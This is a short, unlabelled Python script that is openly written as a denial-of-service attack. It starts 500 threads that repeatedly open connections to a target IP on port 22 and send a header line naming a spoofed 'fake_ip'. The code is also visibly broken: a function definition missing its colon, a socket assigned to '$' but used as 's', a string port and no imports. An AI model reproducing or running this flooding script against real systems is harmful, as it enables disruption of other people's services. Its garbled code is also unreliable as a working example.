target = ' 192.168.0.1'
port = '22'
fake_ip = '102.21.20.22'

def attack()
    while True:
        $ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()